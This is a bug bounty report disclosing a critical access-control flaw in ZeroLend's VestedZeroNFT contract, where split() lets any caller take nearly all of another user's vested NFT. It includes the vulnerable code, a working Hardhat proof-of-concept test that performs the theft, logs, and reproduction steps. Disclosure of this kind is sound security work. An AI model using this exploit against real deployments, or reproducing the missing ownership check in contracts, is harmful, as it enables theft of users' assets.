# 29204 - \[SC - Critical] Direct theft of Users VestedZeroNFT by using sp...

## Direct theft of User's VestedZeroNFT by using split function to mint a new NFT to take most fraction of the theft NFT of other users

Submitted on Mar 10th 2024 at 16:23:41 UTC by @perseverance for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29204

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/zerolend/governance>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

### Description

## Description

Direct theft of User's VestedZeroNFT by using split function to mint a new NFT to take most fraction of the theft NFT of other users

### Brief/Intro

VestedZeroNFT is a NFT based contract to hold all the user vests. NFTs can be traded on secondary marketplaces like Opensea, can be split into smaller chunks to allow for smaller otc deals to happen in secondary markets.

When mint a NFT tokenIT for a user, the function mint() can be used

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L63-L72>

```solidity
function mint(
        address _who,
        uint256 _pending,
        uint256 _upfront,
        uint256 _linearDuration,
        uint256 _cliffDuration,
        uint256 _unlockDate,
        bool _hasPenalty,
        VestCategory _category
    ) external returns (uint256) 

```

The VestedZeroNFT has the split functionality to split a existed tokenID to mint a new tokenID

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L230-L273>

```solidity
/// @inheritdoc IVestedZeroNFT
    function split(
        uint256 tokenId,
        uint256 fraction
    ) external whenNotPaused nonReentrant {
        _requireOwned(tokenId);
        require(fraction > 0 && fraction < denominator, "!fraction");
        require(!frozen[tokenId], "frozen");

        LockDetails memory lock = tokenIdToLockDetails[tokenId];

        uint256 splitPendingAmount = (lock.pending * fraction) / denominator;
        uint256 splitUpfrontAmount = (lock.upfront * fraction) / denominator;
        uint256 splitUnlockedPendingAmount = (lock.pendingClaimed * fraction) /
            denominator;
        uint256 splitUnlockedUpfrontAmount = (lock.upfrontClaimed * fraction) /
            denominator;

        tokenIdToLockDetails[tokenId] = LockDetails({
            cliffDuration: lock.cliffDuration,
            unlockDate: lock.unlockDate,
            createdAt: lock.createdAt,
            linearDuration: lock.linearDuration,
            pending: splitPendingAmount,
            pendingClaimed: splitUnlockedPendingAmount,
            upfrontClaimed: splitUnlockedUpfrontAmount,
            upfront: splitUpfrontAmount,
            hasPenalty: lock.hasPenalty,
            category: lock.category
        });

        _mint(msg.sender, ++lastTokenId);
        tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: lock.cliffDuration,
            unlockDate: lock.unlockDate,
            createdAt: block.timestamp,
            linearDuration: lock.linearDuration,
            pending: lock.pending - splitPendingAmount,
            pendingClaimed: lock.pendingClaimed - splitUnlockedPendingAmount,
            upfrontClaimed: lock.upfrontClaimed - splitUnlockedUpfrontAmount,
            upfront: lock.upfront - splitUpfrontAmount,
            hasPenalty: lock.hasPenalty,
            category: lock.category
        });
    }
```

The intended purpose is that this allows the owner of the tokenID to split and mint a new tokenID from a fraction of the current tokenID.

### Vulnerability Details

The vulnerability is this function does not check the msg.sender is the owner of the tokenID. The only check is:

```solidity
 _requireOwned(tokenId); 
```

This check is from ERC721Upgradeable contract. <https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L477-L483>

```solidity
/**
     * @dev Reverts if the `tokenId` doesn't have a current owner (it hasn't been minted, or it has been burned).
     * Returns the owner.
     *
     * Overrides to ownership logic should be done to {_ownerOf}.
     */
    function _requireOwned(uint256 tokenId) internal view returns (address) {
        address owner = _ownerOf(tokenId);
        if (owner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }
        return owner;
    }
```

So the function just checks that the owner is not zero.

So the attacker can use this function to steal most fraction of the VestedZeroNFT tokenID.

The attacker can call

```solidity
split(tokenID,1)
```

For the tokenID, the attacker can use any existed tokenID.

The fraction is 1 to steal most of current tokenID to mint a new tokenID for the attacker.

For example, if Ant has a tokenID for example = 2 that: pending = 10\_000 \* 10\*\*18

After the hack, The tokenID = 2 pending = 1 \* 10\*\*18

The hacker new minted tokenID has

pending = 9999 \* 10\*\* 18

So 99.99% amount of pending of Ant's tokenID was stolen by the attacker.

The attacker can steal from tokenID of any owner, including the StakingBonus contract.

## Impacts

## About the severity assessment

So the bug allow attackers to steal the VestedZeroNFT token of users.\
So the Severity is Critical with Category: Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

## Proof of Concept

Test code POC:

```typescript
it("Direct theft of ZeroVestedNFT", async function () {
    console.log("Create the pre-condition setup for attack: User Ant has 1 VestedZeroNFT");
    let lastTokenId = await vest.lastTokenId();
    console.log("The address of the owner of the lastTokenId: ", await vest.ownerOf(lastTokenId));
    console.log("The address of StakingBonus contract: ", stakingBonus.target.toString());

    console.log("Mint a VestedZeroNFT for Ant by calling mint() function of VestedZeroNFT contract"); 
    tokenId = await vest.mint(
      ant.address,
      e18 * 10000n, // 10000 ZERO linear vesting
      0, // 0 ZERO upfront
      1000, // linear duration - 1000 seconds
      0, // cliff duration - 0 seconds
      now + 1000, // unlock date
      false, // penalty -> false
      0
     );

    
    console.log("Zero balance of Ant", await zero.balanceOf(ant.address));
    console.log("Zero balance of vestZeroNFT contract", await zero.balanceOf(vest.target));
    lastTokenId = await vest.lastTokenId();
    console.log("Ant address: ", ant.address);
    
    console.log("The address of the owner of the TokenId: ", lastTokenId, await vest.ownerOf(lastTokenId));
    expect(await vest.ownerOf(lastTokenId)).eq(ant.address);
    
    console.log("Get tokenIdToLockDetails of the lastTokenId");
    let tokenIdToLockDetails = await vest.tokenIdToLockDetails(lastTokenId);
    console.log("tokenIdToLockDetails: ", tokenIdToLockDetails); 
    
    /*-------------------------------------*/

    console.log("Execute the attack to steal the amount of pending of the VestedZeroNFT to mint a new tokenID for the attacker");
    const [attacker] = await hre.ethers.getSigners();
    console.log("Attacker address: ", attacker.address);

    console.log("Call split to theft the tokenID of Ant");
    console.log("LastTokenId: ", lastTokenId);
   
    await vest.connect(attacker).split(2,1) ;

    tokenIdToLockDetails = await vest.tokenIdToLockDetails(lastTokenId);
    expect(await vest.ownerOf(2)).eq(ant.address);

    console.log("tokenIdToLockDetails: ", tokenIdToLockDetails); 

    lastTokenId = await vest.lastTokenId();
    console.log("The owner address of the lastTokenId: ", await vest.ownerOf(lastTokenId));
    expect(await vest.ownerOf(lastTokenId)).eq(attacker.address);

    console.log("Get tokenIdToLockDetails of the lastTokenId");
    tokenIdToLockDetails = await vest.tokenIdToLockDetails(lastTokenId);
    console.log("tokenIdToLockDetails: ", tokenIdToLockDetails); 

  });
```

In the above POC, to execute the attack, the hacker call the split function

```typescript
await vest.connect(attacker).split(2,1) ;
```

Test log:\
Full Test Log: <https://drive.google.com/file/d/1uQI10CD-J9HB4KweMPAlMUj19OEzadk0/view?usp=sharing>

```
Create the pre-condition setup for attack: User Ant has 1 VestedZeroNFT
The address of the owner of the lastTokenId:  0x9E545E3C0baAB3E08CdfD552C960A1050f373042
The address of StakingBonus contract:  0x9E545E3C0baAB3E08CdfD552C960A1050f373042
Mint a VestedZeroNFT for Ant by calling mint() function of VestedZeroNFT contract
Zero balance of Ant 0n
Zero balance of vestZeroNFT contract 10000000000000000000000n
Ant address:  0x70997970C51812dc3A010C7d01b50e0d17dc79C8
The address of the owner of the TokenId:  2n 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
Get tokenIdToLockDetails of the lastTokenId
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  10000000000000000000000n,
  0n,
  0n,
  1000n,
  1710064957n,
  false,
  0n
]
Execute the attack to steal the amount of pending of the VestedZeroNFT to mint a new tokenID for the attacker
Attacker address:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Call split to theft the tokenID of Ant
LastTokenId:  2n
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  1000000000000000000n,
  0n,
  0n,
  1000n,
  1710064957n,
  false,
  0n
]
The owner address of the lastTokenId:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Get tokenIdToLockDetails of the lastTokenId
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  9999000000000000000000n,
  0n,
  0n,
  1000n,
  1710064958n,
  false,
  0n
]
    ✔ Direct theft of ZeroVestedNFT (283ms)

```

Test Log explanation:

So Pre-condition: Ant has 1 VestedZeroNFT with id = 2 The tokenIdToLockDetails information for this tokenID

```
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  10000000000000000000000n,
  0n,
  0n,
  1000n,
  1710064957n,
  false,
  0n
]
```

This means pending = 10 000 \* 10 \*\*18

After the attack, The tokenIdToLockDetails information for this tokenID

```
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  1000000000000000000n,
  0n,
  0n,
  1000n,
  1710064957n,
  false,
  0n
]
```

So the pending is 1 \* 10 \*\*18

The attacker now has a tokenID = 3 with information

```
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  9999000000000000000000n,
  0n,
  0n,
  1000n,
  1710064958n,
  false,
  0n
]
```

The pending = 9999 \* 10 \*\* 18

To run the POC,

Step 1: First clone the governance repository:

```
git clone https://github.com/zerolend/governance.git
```

Step2: Apply Git patch file

Bug5\_diff.patch link: <https://drive.google.com/file/d/1lsQmql7Bg4OAaSJJkK9\\_PD0Is1HyLqPV/view?usp=sharing>

Apply the Patch by Git command using Git bash shell

```bash
git apply Bug5_diff_2.patch
```

Step 3: Input .env variables

cd to folder governance, To run the test, you need to

1. rename .env.example to .env
2. put the test Private\_key to the variable

```
   WALLET_PRIVATE_KEY= 
   NODE_ENV == "test" 
```

Step 4: Install and run test Run command

```
yarn install 
yarn test > test_all.log
```
